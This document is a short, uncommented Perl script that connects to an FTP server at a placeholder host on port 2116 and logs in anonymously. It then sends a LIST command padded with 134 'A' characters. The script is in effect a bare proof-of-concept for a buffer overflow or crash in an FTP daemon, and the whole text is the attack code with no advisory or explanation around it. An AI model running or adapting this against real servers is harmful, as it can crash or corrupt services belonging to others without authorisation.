#!/usr/bin/perl

use IO::Socket;

$host = "www.example.com";

$remote = IO::Socket::INET->new ( Proto => "tcp",
     PeerAddr => $host,
     PeerPort => "2116",
    );

unless ($remote) { die "cannot connect to ftp daemon on $host" }

print "connected\n";
while (<$remote>)
{
 print $_;
 if (/220 /)
 {
  last;
 }
}

$remote->autoflush(1);

my $ftp = "USER anonymous\r\n";

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/331 /)
 {
  last;
 }
}

$ftp = join("", "PASS ", "a\@b.com", "\r\n");
print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/230 /)
 {
  last;
 }
}

my $ftp = join ("", "LIST -l:", "A"x(134), "\r\n");

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/250 Done/)
 {
  last;
 }
}

close $remote;
